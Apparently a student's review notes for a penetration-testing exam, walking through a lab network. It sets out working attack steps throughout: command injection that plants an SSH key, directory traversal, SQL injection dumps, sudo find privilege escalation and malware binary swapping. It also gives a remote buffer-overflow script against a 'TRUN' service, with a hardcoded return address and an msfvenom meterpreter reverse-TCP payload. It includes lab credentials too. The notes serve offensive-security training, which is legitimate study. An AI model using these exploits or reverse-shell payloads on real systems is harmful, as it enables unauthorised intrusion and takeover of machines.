

SSgt Wilson Review:



Test will be one ip address and go from there. 

Steps/methodology:
	host discovery
		for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
		
	port discovery
		nmap -sT -T4 -p 1-10000 <ip>
	
	port interrogation
	
	exploitation


web exploitation:

don't forget to look at robots.txt to find directories.

command injection or webshell:
	Test with.
	'; whoami'

	
	All you should do with command injection is upload your ssh key:
		;mkdir .ssh
		
	ssh-keygen -t rsa
        cat ~/.ssh/id_rsa.pub
        	*this is your new new public key
    
    now do a command injection on the web server to make .ssh directory:
        ; mkdir /var/www/.ssh
    
    now do a command injection again to add your key to authorized keys:
        ; echo "<full key>" >> /var/www/.ssh/authorized_keys
        ; cat /var/www/.ssh/authorized_keys		

    now just do:
	ssh www-data@<target ip>
	and i should get in without giving a password.
	
	
Windows Exploitation:
	
	Binary replacement:
		You must be able to rename the executable.
	
	DLL Hijacking:
		Don't waste your time...
	
	They'll give us the file we need to replace it with.
	
	

Finding vulnerable binaries:
	Check vulnerable services:
		Look for no description or a 'hilarious' description.
		if the "path to executable" is normal, it's probably not the one.

WINDOWS HAS HIDDEN FILES!!!!!
When in the GUI, Hidden files and filename extension should always be on.

steps:
	get malware,
	put it in folder with legit executable.
	move the legit one away.
	rename the malware with the name of the legit one.
	
COMMAND TO FIND THE AUDIT POLICY ON WINDOWS (AS ADMIN ONLY):
	auditpol /get /category:* | findstr /i "success failure"

If you hear persistence, think run keys.








Linux Exploitation:

	***Check sudo -l to find the function I'm supposed to exploit.
	***make the script in /tmp/
	Buffer overflow example steps:
		- bring malware back to your machine. *you need to use peda*
		
		***use func as example malware.***
		gdb func
		disass main
		green is function calls.
		disass <functions within main>
		**identify vulnerable function. **IT IS NOT PRINTF**
		
		go to wiremask buffer overflow generator to get the pattern. 
		
		script:
		
		offset = <wiremask pattern>
		print(buffer)
		==END==
		
		(in gdb)
		run <<< $(overflow.py)
			***try with and without tripple carrots if it isn't working***
		
		now find offset in wiremask,
		make buffer:
			offset = "A" * <offset>
			
		
		now we need to find jump esp instruction:
		
		(on target machine)	
		env - gdb func
		unset env LINES
		unset env COLUMNS
		
		**overflow the program**
		info proc map
		
		*now find jump esp*
		find /b <first after heap>, <last before start of stack>, 0xff, 0xe4
		
		grab a handful of the resulting addresses and put them in the script commented out.
		
		make eip in the script equal to the bytes in reverse order. Split them up to copy them down, just a bit easier.
		
		add your nop sled to the script:
			nop = "\x90" * 15
		
		generate shell code:
			msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python	
		
		add:
		print(offset, eip, nop, buf)
		
		now send it:
		./ func <<< $(python overflow.py)




====================================
dryrun steps:			    ||
====================================

nmap -Pn -T4 <my initial ip> -sT
	returns port 22 and port 80 are open.

banner grab both, don't assume.

we don't have creds, so we can't attack ssh. We have a website though, which is a better option.


One way to start enumerating is just opening up firefox, which is fine.
Even better though, is using nikto:
	nikto -h <ip>
	This will return /scripts and /login
Nmap NSE could also give you more info.
user --script http-enum or --script discovery
	Will give the same results in this case.
		
/scripts gives you 'user2:EaglesIsARE78' creds

{
	alternate method to get creds:
	go to login page
	use the basic '1 or 1='1 sql injection
	in developer tools, GET the raw post request in network tab
	now append a ?<raw request> into the url
	this makes it into a GET request
	This will spill creds.
}


now looking at /getcareers

this is directory traversal, not command injection. '; whoami' does not work

use:
../../../../../../../../../etc/passwd
../../../../../../../../../etc/hosts

not that useful, but it gives us users.

THE ONLY ENCODING WE'LL USE IS ROT13 and base64
WE'LL know the names of the boxes  we're attacking on the test

The file upload thing was a waste of time. 





Now on the backend of the first box:
first, run whoami and hostname
	user2
	PublicFacingWebsite


Now try to root the box:

always try:
	sudo -l first.
	no dice.

now try:
	find / -type f -perm /(4, 2, 6)000 2>/dev/null
	look at everything in GTFO bins. 
	also no results.
	check 4000, then 2000, then 6000


You're not supposed to get root on all 4 boxes. 
	
IMPORTANT NOTE IMPORTANT NOTE IMPORTANT NOTE:
	which gdb
	IF THE BOX HAS GDB, YOU WILL BE DOING A BUFFER OVERFLOW ON THE BOX!!!


We can't get root on this machine, so move on to the next box. 

ip neigh
ip route
ip addr
cat /etc/hosts.

/etc/hosts gives us:
192.168.28.181

also do the ping sweep command:
results:
	192.168.28.181
	192.168.28.172

set up Dynamic Port forward to hit the .181:
	ssh user2@<ip> -D 9050

now do port discovery:
	proxychains nmap -sT -Pn -T4 -p 1-10000 <ip> -script discovery
	
good practice is to close the dynamic tunnel as soon as you're done with it.

replace it with a local port forward hitting port 80 on the .181:
	ssh user2@<1st ip> -L <RHP>:192.168.28.181:80

now open firefox.

we're looking at a website
This is a SQL injection.
on this one, we can use the golden statement:
	(# )UNION select table_schema,table_name,column_name from information_schema.columns

SSgt Wilson steps:
	0- Identify SQL database
	1- Identify method for SQL database variables, get or post?
	2- Identify vulnerable field.
	3- Identify number of Columns <- skip and parish
	4- Use golden statement
	5- Enumerate user created tables: select <columns> from <database>.<table>
	6- profit


sql injection:
 7 UNION SELECT username,name,user_id from siteusers.users

will give me all the users, passwords, and their ids. 
All of the passwords are ROT13 encoded.

SQL database may turn sideways...

the creds we get from this SQL database work on the .172 host.

WRITE THIS DOWN WRITE THIS DOWN::::

sudo find . -exec /bin/bash \; -quit
	is different from
sudo ./find . -exec /bin/bash \' -quit

^^This is how we privilege escalated on RoundSensor

445 is always SMB
3389 is always RDP


set dynamic port forward from the .172

then do:
proxychains nmap -T4 -Pn -script discovery -p 1-10000 192.168.28.179




we find 9999 is open. It's running secure server.

		THAT MEANS REMOTE BUFFER OVERFLOW.
msfconsole
use multi/handler
set LPORT 0.0.0.0
set LPORT 4444 (or same RHP)




Script to do the overflow:
	import socket

	buf = "TRUN /.:/"
	buf += "A" * 2003
	buf += "\xa0\x12\x50\x62"
	buf += '\x90' * 20

	buf (+)=<MSF VENOM PAYLOAD>

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('0.0.0.0', RHP))
	s.recv(1024)
	s.send(buf)
	s.recv(1024)
	s.close()



Shellcode Generation:
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<linops ip> LPORT=<RHP> -b '\x00' -f python
		***RHP should match what you use in meterpreter.
	
THE EIP FOR SECURESERVER---  \xa0\x12\x50\x62


YOU MUST SUBMIT OP NOTES TO GET CREDIT FOR THE EXAM.


If you see a wall of text, you should read it.
If you don't fee like it, you should look for links or other interesting things instead.







